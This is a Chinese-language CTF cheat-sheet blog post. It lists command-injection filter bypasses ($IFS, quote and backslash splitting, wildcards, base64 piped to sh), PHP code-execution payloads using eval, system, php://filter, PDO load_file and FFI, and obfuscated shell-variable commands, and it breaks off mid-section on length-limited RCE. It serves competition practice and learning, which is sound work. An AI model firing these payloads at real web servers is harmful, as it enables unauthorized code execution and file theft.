---
layout:     post
title:      CTF思路小总结
subtitle:   CTF常见方法技巧
date:       2021-05-26
author:     Sprint#51264
header-img: img/post-bg-universe.jpg
catalog: true
tags:
    - CTF
---
<!-- TOC -->

- [引言](#%E5%BC%95%E8%A8%80)
- [隐藏内容](#%E9%9A%90%E8%97%8F%E5%86%85%E5%AE%B9)
- [正则绕过](#%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87)
    - [空格绕过](#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87)
        - [$IFS](#ifs)
    - [分号](#%E5%88%86%E5%8F%B7)
    - [关键字全字匹配](#%E5%85%B3%E9%94%AE%E5%AD%97%E5%85%A8%E5%AD%97%E5%8C%B9%E9%85%8D)
        - [清奇思路](#%E6%B8%85%E5%A5%87%E6%80%9D%E8%B7%AF)
- [命令执行](#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)
    - [概述](#%E6%A6%82%E8%BF%B0)
    - [常见方法](#%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95)
        - [PHP特性命令](#php%E7%89%B9%E6%80%A7%E5%91%BD%E4%BB%A4)
        - [中断进程](#%E4%B8%AD%E6%96%AD%E8%BF%9B%E7%A8%8B)
        - [直接函数使用](#%E7%9B%B4%E6%8E%A5%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8)
        - [造参传参](#%E9%80%A0%E5%8F%82%E4%BC%A0%E5%8F%82)
        - [包含指定文件变量](#%E5%8C%85%E5%90%AB%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E5%8F%98%E9%87%8F)
        - [变量输出](#%E5%8F%98%E9%87%8F%E8%BE%93%E5%87%BA)
        - [目录查看](#%E7%9B%AE%E5%BD%95%E6%9F%A5%E7%9C%8B)
        - [数据库对象PDO](#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E8%B1%A1pdo)
        - [UAFuse after free](#uafuse-after-free)
        - [FFI语言交互接口](#ffi%E8%AF%AD%E8%A8%80%E4%BA%A4%E4%BA%92%E6%8E%A5%E5%8F%A3)
        - [命令构造](#%E5%91%BD%E4%BB%A4%E6%9E%84%E9%80%A0)
        - [$cmd](#cmd)
        - [通配符+''+""绕过](#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87)
        - [拼接或转义符](#%E6%8B%BC%E6%8E%A5%E6%88%96%E8%BD%AC%E4%B9%89%E7%AC%A6)
    - [shell命令](#shell%E5%91%BD%E4%BB%A4)
    - [长度限制](#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6)
    - [模糊测试](#%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95)
- [无字母RCE](#%E6%97%A0%E5%AD%97%E6%AF%8Drce)
    - [位运算异或RCE](#%E4%BD%8D%E8%BF%90%E7%AE%97%E5%BC%82%E6%88%96rce)
    - [位运算取反RCE](#%E4%BD%8D%E8%BF%90%E7%AE%97%E5%8F%96%E5%8F%8Drce)
    - [$数学运算适用于多种进制](#%E6%95%B0%E5%AD%A6%E8%BF%90%E7%AE%97%E9%80%82%E7%94%A8%E4%BA%8E%E5%A4%9A%E7%A7%8D%E8%BF%9B%E5%88%B6)
    - [页面构造](#%E9%A1%B5%E9%9D%A2%E6%9E%84%E9%80%A0)
    - [linux cmd命令正则](#linux-cmd%E5%91%BD%E4%BB%A4%E6%AD%A3%E5%88%99)
- [PHP字符串解析漏洞](#php%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E)
- [PHP常见函数](#php%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0)
    - [字符串函数](#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0)
    - [时间日期函数](#%E6%97%B6%E9%97%B4%E6%97%A5%E6%9C%9F%E5%87%BD%E6%95%B0)
    - [数学相关函数](#%E6%95%B0%E5%AD%A6%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0)
    - [数组相关函数](#%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0)
    - [判断变量](#%E5%88%A4%E6%96%AD%E5%8F%98%E9%87%8F)
    - [文件操作函数重要！！](#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0%E9%87%8D%E8%A6%81)
    - [排序](#%E6%8E%92%E5%BA%8F)
    - [报错](#%E6%8A%A5%E9%94%99)
    - [常量](#%E5%B8%B8%E9%87%8F)
    - [序列化](#%E5%BA%8F%E5%88%97%E5%8C%96)
    - [编码](#%E7%BC%96%E7%A0%81)
- [PHP特性](#php%E7%89%B9%E6%80%A7)
    - [短标签](#%E7%9F%AD%E6%A0%87%E7%AD%BE)
- [松散比较](#%E6%9D%BE%E6%95%A3%E6%AF%94%E8%BE%83)
    - [函数绕过](#%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87)
        - [strcmp](#strcmp)
        - [intval](#intval)
        - [大小比较](#%E5%A4%A7%E5%B0%8F%E6%AF%94%E8%BE%83)
        - [is_numeric](#is_numeric)
        - [preg_match](#preg_match)
        - [basename](#basename)
    - [内置类](#%E5%86%85%E7%BD%AE%E7%B1%BB)
        - [反射类ReflectionClass](#%E5%8F%8D%E5%B0%84%E7%B1%BBreflectionclass)
        - [迭代器FilesystemIterator](#%E8%BF%AD%E4%BB%A3%E5%99%A8filesystemiterator)
    - [变量覆盖](#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96)
        - [extractarray,extract_rules,prefix变量覆盖](#extractarrayextract_rulesprefix%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96)
        - [parse_str](#parse_str)
        - [动态变量覆盖](#%E5%8A%A8%E6%80%81%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96)
        - [parse_strstring,result变量覆盖](#parse_strstringresult%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96)
        - [import_request_variables](#import_request_variables)
        - [register_globals](#register_globals)
    - [非法变量转换](#%E9%9D%9E%E6%B3%95%E5%8F%98%E9%87%8F%E8%BD%AC%E6%8D%A2)
- [PHP反序列化](#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)
    - [序列化后格式讲解](#%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E6%A0%BC%E5%BC%8F%E8%AE%B2%E8%A7%A3)
    - [魔法函数](#%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0)
    - [invoke](#invoke)
    - [反序列化链](#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE)
    - [字符逃逸](#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8)
    - [对象逃逸](#%E5%AF%B9%E8%B1%A1%E9%80%83%E9%80%B8)
    - [方法引用](#%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8)
    - [小技巧](#%E5%B0%8F%E6%8A%80%E5%B7%A7)
- [JAVA反序列化](#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)
    - [方法](#%E6%96%B9%E6%B3%95)
    - [工具](#%E5%B7%A5%E5%85%B7)
    - [常用函数](#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0)
- [JavaScript](#javascript)
    - [常用函数](#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0)
    - [原型链污染](#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)
- [文件上传](#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
    - [前端验证](#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81)
    - [后端验证](#%E5%90%8E%E7%AB%AF%E9%AA%8C%E8%AF%81)
        - [类型绕过](#%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87)
    - [一句话木马](#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC)
    - [图片马](#%E5%9B%BE%E7%89%87%E9%A9%AC)
    - [二次渲染](#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93)
    - [配置文件](#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6)
    - [解析漏洞](#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E)
    - [常见文件头](#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4)
    - [常见MIME类型](#%E5%B8%B8%E8%A7%81mime%E7%B1%BB%E5%9E%8B)
    - [骚操作写马](#%E9%AA%9A%E6%93%8D%E4%BD%9C%E5%86%99%E9%A9%AC)
    - [小技巧](#%E5%B0%8F%E6%8A%80%E5%B7%A7)
- [文件包含](#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)
    - [相关函数](#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0)
    - [常用伪协议](#%E5%B8%B8%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE)
    - [日志包含](#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB)
        - [日志路径](#%E6%97%A5%E5%BF%97%E8%B7%AF%E5%BE%84)
    - [临时文件包含](#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)
        - [前置知识](#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86)
        - [session包含无后缀文件包含](#session%E5%8C%85%E5%90%AB%E6%97%A0%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)
    - [PHP7 Segment Fault](#php7-segment-fault)
    - [包含environ文件](#%E5%8C%85%E5%90%ABenviron%E6%96%87%E4%BB%B6)
    - [proc目录下的敏感文件](#proc%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6)
    - [包含临时文件](#%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6)
    - [路径长度截断绕过](#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87)
    - [日志包含方法](#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%96%B9%E6%B3%95)
    - [%00截断绕过](#%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87)
    - [目录遍历绕过](#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E7%BB%95%E8%BF%87)
    - [URL绕过](#url%E7%BB%95%E8%BF%87)
    - [文件开头exit绕过](#%E6%96%87%E4%BB%B6%E5%BC%80%E5%A4%B4exit%E7%BB%95%E8%BF%87)
        - [概述](#%E6%A6%82%E8%BF%B0)
        - [base64](#base64)
        - [反转字符](#%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6)
    - [防御措施](#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD)
- [XSS](#xss)
    - [绕过思路](#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF)
    - [XSS利用](#xss%E5%88%A9%E7%94%A8)
    - [常见XSS测试](#%E5%B8%B8%E8%A7%81xss%E6%B5%8B%E8%AF%95)
    - [常见标签属性](#%E5%B8%B8%E8%A7%81%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7)
    - [常见过滤方法](#%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E6%96%B9%E6%B3%95)
    - [XSS防御](#xss%E9%98%B2%E5%BE%A1)
    - [小知识](#%E5%B0%8F%E7%9F%A5%E8%AF%86)
- [SSRF](#ssrf)
    - [漏洞挖掘](#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98)
    - [产生SSRF漏洞的函数](#%E4%BA%A7%E7%94%9Fssrf%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0)
    - [SSRF中的伪协议](#ssrf%E4%B8%AD%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE)
    - [SSRF漏洞利用危害](#ssrf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8D%B1%E5%AE%B3)
    - [SSRF绕过方式](#ssrf%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F)
    - [常见限制](#%E5%B8%B8%E8%A7%81%E9%99%90%E5%88%B6)
    - [SSRF漏洞防御](#ssrf%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1)
- [XXE](#xxe)
    - [XML](#xml)
    - [DTD](#dtd)
- [源码泄露](#%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2)
    - [常用备份文件后缀](#%E5%B8%B8%E7%94%A8%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80)
    - [源码泄露](#%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2)
        - [WEB-INF/web.xml泄露](#web-infwebxml%E6%B3%84%E9%9C%B2)
    - [数据库泄露](#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%84%E9%9C%B2)
        - [asp+access](#aspaccess)
- [常见函数绕过](#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87)
    - [md5函数绕过](#md5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87)
- [SQL注入](#sql%E6%B3%A8%E5%85%A5)
    - [右查询](#%E5%8F%B3%E6%9F%A5%E8%AF%A2)
    - [堆叠注入](#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5)
        - [Handler](#handler)
        - [预处理](#%E9%A2%84%E5%A4%84%E7%90%86)
    - [宽字节注入](#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5)
    - [报错注入](#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5)
    - [UPDATE 注入](#update-%E6%B3%A8%E5%85%A5)
    - [盲注](#%E7%9B%B2%E6%B3%A8)
        - [Bool盲注](#bool%E7%9B%B2%E6%B3%A8)
        - [时间盲注](#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)
        - [异或盲注](#%E5%BC%82%E6%88%96%E7%9B%B2%E6%B3%A8)
        - [order by 盲注](#order-by-%E7%9B%B2%E6%B3%A8)
        - [函数存储过程](#%E5%87%BD%E6%95%B0%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B)
    - [其他注](#%E5%85%B6%E4%BB%96%E6%B3%A8)
        - [limit 注入PROCEDURE](#limit-%E6%B3%A8%E5%85%A5procedure)
        - [group by 注入](#group-by-%E6%B3%A8%E5%85%A5)
        - [文件名注入](#%E6%96%87%E4%BB%B6%E5%90%8D%E6%B3%A8%E5%85%A5)
        - [分割注入](#%E5%88%86%E5%89%B2%E6%B3%A8%E5%85%A5)
    - [正则注入](#%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5)
    - [无列名注入](#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5)
    - [information_schema过滤](#information_schema%E8%BF%87%E6%BB%A4)
    - [SQL读写文件](#sql%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6)
    - [SQL注入写shell](#sql%E6%B3%A8%E5%85%A5%E5%86%99shell)
    - [日志GetShell](#%E6%97%A5%E5%BF%97getshell)
    - [爆绝对路径](#%E7%88%86%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84)
    - [概述Mysql信息](#%E6%A6%82%E8%BF%B0mysql%E4%BF%A1%E6%81%AF)
    - [常用函数](#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0)
    - [绕过过滤](#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4)
    - [小技巧](#%E5%B0%8F%E6%8A%80%E5%B7%A7)
- [无参数RCE](#%E6%97%A0%E5%8F%82%E6%95%B0rce)
    - [前言](#%E5%89%8D%E8%A8%80)
    - [概念](#%E6%A6%82%E5%BF%B5)
    - [使用](#%E4%BD%BF%E7%94%A8)
        - [getenv办法](#getenv%E5%8A%9E%E6%B3%95)
        - [getallheaders](#getallheaders)
        - [get_defined_vars](#get_defined_vars)
        - [session_id](#session_id)
        - [dirname&chdir](#dirnamechdir)
- [PHPINFO关注点](#phpinfo%E5%85%B3%E6%B3%A8%E7%82%B9)
- [JAVA](#java)
    - [Javan基础](#javan%E5%9F%BA%E7%A1%80)
        - [servlet](#servlet)
    - [Struts 2](#struts-2)
        - [S2-001](#s2-001)
- [Nodejs](#nodejs)
    - [原型链污染](#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)
    - [特性](#%E7%89%B9%E6%80%A7)
- [SSTI模板注入](#ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)
    - [基本概念](#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5)
    - [ctf中的一些绕过tips](#ctf%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87tips)
    - [思路图](#%E6%80%9D%E8%B7%AF%E5%9B%BE)
    - [FlaskJinja2服务端模板注入](#flaskjinja2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)
    - [常用payload](#%E5%B8%B8%E7%94%A8payload)
- [JWTJSON Web Token](#jwtjson-web-token)
    - [cookie、session、token](#cookiesessiontoken)
    - [区别](#%E5%8C%BA%E5%88%AB)
    - [JWT](#jwt)
- [暴力破解](#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3)
    - [burpsuite](#burpsuite)
        - [爆破模式](#%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F)
        - [payload type](#payload-type)
        - [payload processing](#payload-processing)
    - [带有token爆破](#%E5%B8%A6%E6%9C%89token%E7%88%86%E7%A0%B4)
- [流量包分析](#%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90)
    - [binwalk判断是否传输文件](#binwalk%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6)
    - [dd提取文件](#dd%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6)
    - [foremost提取文件](#foremost%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6)
    - [file 查看具体文件类型](#file-%E6%9F%A5%E7%9C%8B%E5%85%B7%E4%BD%93%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B)
    - [strings提取文件内字符](#strings%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%97%E7%AC%A6)
    - [以图片格式直接查看数据](#%E4%BB%A5%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E7%9B%B4%E6%8E%A5%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE)
- [日志分析](#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90)
    - [linux-shell](#linux-shell)
    - [windows-cmd](#windows-cmd)
    - [windows-powershell](#windows-powershell)
    - [windows-sublime](#windows-sublime)
- [常见命令](#%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4)
    - [linux](#linux)
    - [注](#%E6%B3%A8)
- [正则匹配](#%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D)
    - [修饰符元字符](#%E4%BF%AE%E9%A5%B0%E7%AC%A6%E5%85%83%E5%AD%97%E7%AC%A6)
- [AWD](#awd)
- [其他](#%E5%85%B6%E4%BB%96)
    - [inda编码转utf-8编码绕过](#inda%E7%BC%96%E7%A0%81%E8%BD%ACutf-8%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87)
    - [DNS rebinding](#dns-rebinding)
    - [IP来源判断](#ip%E6%9D%A5%E6%BA%90%E5%88%A4%E6%96%AD)
    - [管道符](#%E7%AE%A1%E9%81%93%E7%AC%A6)
    - [语言特性](#%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7)
    - [代码执行函数集合](#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E9%9B%86%E5%90%88)
    - [显示文件内容函数总结](#%E6%98%BE%E7%A4%BA%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93)
    - [命令执行函数集合](#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E9%9B%86%E5%90%88)
    - [利用集合](#%E5%88%A9%E7%94%A8%E9%9B%86%E5%90%88)
    - [常用端口服务对应表](#%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AF%B9%E5%BA%94%E8%A1%A8)
    - [抓包改包](#%E6%8A%93%E5%8C%85%E6%94%B9%E5%8C%85)
    - [python开SMB](#python%E5%BC%80smb)
    - [概念科普](#%E6%A6%82%E5%BF%B5%E7%A7%91%E6%99%AE)
- [脚本](#%E8%84%9A%E6%9C%AC)
    - [爆破脚本](#%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC)
    - [绕过测试](#%E7%BB%95%E8%BF%87%E6%B5%8B%E8%AF%95)
    - [session 文件包含](#session-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)
- [工具参数](#%E5%B7%A5%E5%85%B7%E5%8F%82%E6%95%B0)
    - [SQLmap](#sqlmap)
        - [SQLMAP特性](#sqlmap%E7%89%B9%E6%80%A7)
    - [dirseach](#dirseach)
    - [nmap](#nmap)

<!-- /TOC -->


# 引言

开始做题扫泄露
页面有互动就页面上完成
页面有内容可以挖掘就从页面入手
没有思路就抓包分析
再没有思路就第三方工具尝试
数字过滤绕过构造首先考虑特性，再考虑位运算

# 隐藏内容

* 页面黑黢黢，拖鼠标扒拉扒拉同颜色字体
* 查看页面源码直接看元素
* 扫描网站查看隐藏文件
* php://filter查看页面源码
* robots.txt隐藏页面文件(对于不能扫目录的网站更好用)
* 手动猜测隐藏的网页例如`register.php`

# 正则绕过
## 空格绕过
### $IFS
* >IFS(Internal Field Separator)内部字段分隔符，默认为空格，换行，制表符

    `$IFS`
    `${IFS}`
    `$IFS$1` //$1改成$加其他数字都行
    `<` 
    `<>` 
    `{cat,flag.php}`  //用逗号实现了空格功能
    `%20`(空格)
    `%09`(制表符tab)
    `%0a`(换行符)过滤中可能过滤数字，但这里的编码在检测的时候不算数字
    `%0b`(垂直制表)
    `%0c`(换页符)
    `%0d`(回车)
    `%00`(空字符)
    `%A0`
    `''或""`(引号隔)
    c=echo`strings\$IFS\$9f*`

    asd         

## 分号

* `php`中如果`?>`没有被代替可以用其来代替`分号`，因为`php`中最后一条语句可以没有分号

## 关键字(全字匹配)

* `\`
    
    `linux`下将关键字用`\`分隔，可以起到换行连接输入的作用，但是关键字全字匹配不到

* `通配符`

    是通配符代替敏感词中的某一部分，可以对特定文件执行操作

* `''`

    shell特性，`两个单引号`插在字符串中间，执行的时候自动忽略

* `.`source命令

    刷新当前`shell`环境
    在当前环境使用`source`执行`shell脚本`


* 换命令

    `cat->tac(逆向输出)->more(分页输出)->less(分页输出)->tail(文件最尾部信息)`
    
    * `tac`
        >逆向输出文件内容

    * `tail`
        >显示文件尾部内容

        -c<数目>显示的字节数
        -n<行数>显示的行数

    * `head`
        >显示文件开头的内容

        -c<数目>显示的字节数
        -n<行数>显示的行数

    * `od`
        >将文件内容以八进制形式输出

    * `nl`
        >将文件添加行号标注后写到标准输出
        
### 清奇思路

* 命令执行变量拼接

    `/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php`

* 过滤bash用sh执行

    `echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh`

* 内联执行

    `?ip=127.0.0.1;cat$IFS$9`ls``会先执行ls，然后再执行外面的语句

* 造参传参

    `c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php`

    `c=eval($_GET[1]);&1=system('cat flag.php');`

    `c=include%0a$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php`

* 通配符

    如果要对含有关键字的文件进行访问，可以使用`cp`命令结合通配符将文件拷贝到新的文件中，访问新建文件读取源文件内容

    ```php
    
    cp fla?.php 1.txt

    url/1.txt

    ```

* 移花接木

    既然可以命令执行，那就把对应文件中的内容`cp`到新的文档中，然后对文档内容输出，间接读取


# 命令执行

## 概述

命令执行用到的方法在其他板块中也有，主要就是绕过过滤，包含的内容可能是空格绕过，php特性，shell特性，无参RCE，或者无字母RCE

[command execution cheat sheet](https://github.com/payloadbox/command-injection-payload-list)

## 常见方法

### PHP特性命令

`return 1-phpinfo()-1`这样可以执行命令，中间的字符'-'可以替换成其他字符

`return 1?phpinfo():1`三目运算符，可以执行命令

### 中断进程
`ob_get_contents();``ob_end_clean();`获取缓冲区内容，清除缓冲区内容，后面再跟一个替换内容的函数，我们传参可以直接在后面跟 `exit(0);`退出进程，停止执行后面点函数


### 直接函数使用

`echo highlight_file(xxx.php);` 

`show_source(),file_get_contents(),readfile()`

### 造参传参
```php
include($_GET[1])
1=php:\/\/filter/read=convert.base64-encode/resource=xxx.php
```

### 包含指定文件变量
```php
include('flag.php');echo $flag;`
```

### 变量输出
```php
include('flag.php');var_dump(get_defined_vars());
//先包含文件，在不知道对应变量名的情况下输出所有变量
如果是txt文本，包含之后默认自动输出，没有php标签
```
### 目录查看
```php

var_dump(scandir("/"));
print_r(scandir("."));
var_export();
如果scandir目录被封就用*glob://*协议

$c=$it=new DirectoryIterator("glob:///*.txt");//找到所有txt文件
foreach($it as $f) {//遍历输出
    printf("%s\n", $f->getFilename());//输出文件名
}exit();
```

### 数据库对象PDO
`PDO` :PHP数据对象提供了一个数据访问抽象层，不管使用哪种数据库，都可以用相同的函数（方法）来查询获取数据。
```php
try {
    $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象
    echo "连接成功<br/>";
    /*你还可以进行一次搜索操作
    foreach ($dbh->query('SELECT * from FOO') as $row) {
        print_r($row); //你可以用 echo($GLOBAL); 来看到这些值
    }
    */
    $dbh = null;
} catch (PDOException $e) {
    die ("Error!: " . $e->getMessage() . "<br/>");
}

c=try {$dbh= new PDO('mysql:host=localhost;dbname=ctftraining','root','root');foreach($dbh->query('select load_file("/flag36.txt")')as $row){echo($row[0])."|";}$dbh=null;}catch (PDOException $e){echo $e->getMessage();exit(0);}exit(0);
```

### UAF(use after free)
* 概述
    
    >参见[UAF (Use After Free)漏洞分析及利用](https://blog.csdn.net/qq_31481187/article/details/73612451)

    应用程序调用`free()`释放内存时，如果内存块小于`256kb`,`dlmalloc`并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个:一是内存块不一定能马上释放回内核(比如内存块不是位于堆顶端)，二是供应用程序下次申请内存使用(主要原因，我觉得应该是为了提高效率)。当`dlmalloc`种空闲内存达到一定值时`dlmalloc`才将空闲内存释放回内核。如果应用程序申请的内存大于`256kb`，`dlmalloc`调用`mmap()`向内存申请一块内存，返还给应用程序使用。如果应用程序释放的内存大于`256kb`，`dlmalloc`马上调用`munmao()`释放内存。`dlmallloc`不会缓存大于`256kb`的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。

* 正文

    如此可见，如果`p1`指针指向的地址里面有一个函数`p1[3]=echo`,后来对`p1`空间进行释放，虽然释放了，但是内存还没有归还，还可以继续调用，然后申请一个和`p1`相同大小的`p2`空间，那么系统就还会把`p1`的空间分配给`p2`，此时对`p2`进行修改，就会修改`p1`中的内容，替换函数为`p2[3]=system`，然后再调用`p1[3]`就可以执行系统命令了

### FFI(语言交互接口)

```php
c=$ffi=FFI:cdef("int system(const chattrr *command);");
$a='/readflag > /var/www/html/1.txt';
$ffi->system($a);exit();
```
### 命令构造

>用于system()

从当前路径中截取字母构造读取命令`nl.cat等等等等`


`${PATH:~0}${PWD:~0}$IFS????.???`~数字或者字母都代表从最后往前数第几个字母，从这个位置开始截取后面的字符串

`#`代表取长度，`#SHLVL`深度数字的长度为1，也就是深度是一个数字，对深度取长度就是1

>/var/www/html # ls /bin

`${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???`cat flag.php


* 常用变量

```s
${PATH}当前路径
${SHLVL}深度
${HOME}
${PWD}当前目录
${BASH}
${PHP_VERSION}PHP版本
${PHP_CFLAGS}
```

### $(cmd)

```shell

ping $(whoami) --> ping username

#会先执行$()中的命令

```

### 通配符+''+""绕过


### 拼接或转义符

```php

echo shell_exec("nl fla''g.p''hp");

echo shll_exec("cat fla\g.ph\p")

```


## shell命令

* `base64`

```s

（1）base64 file
功能：从指定的文件file中读取数据，编码为base64的字符串然后输出；

（2）echo “string” | base64
功能：将字符串string+换行编码为base64的字符串然后输出；

（3）echo -n “string” | base64
功能：将字符串string编码为base64的字符串然后输出；

```

## 长度限制

>[CTF_Web：8位以内可控字符getshell](https://blog.csdn.net/qq_35493457/article/details/119385240)

>[CTF中字符长度限制下的命令执行 rce(7字符5字符4字符)汇总](https://blog.csdn.net/q20010619/article/details/109206728)

>[4位可控字符下的任意命令执行](https://blog.csdn.net/nzjdsds/article/details/102873203)

>[【CTF 攻略】如何绕过四个字符限制getshell](https://www.anquanke.com/post/id/87203)

>[5位可控字符下的任意命令执行 – 另一种解题方法](https://www.secpulse.com/archives/120302.html)

>https://note.youdao.com/ynoteshare1/index.html?id=129e39825e7bb3b222e613e33685b764&type=note

* 预备知识
    
    ```php
    
    //知识点1
    输入通配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数

    >id
    >root
    *    （等同于命令：id root）

    ----------------------------------------------

    //知识点2，通过rev来倒置输出内容
    >rev
    echo 1234 > v
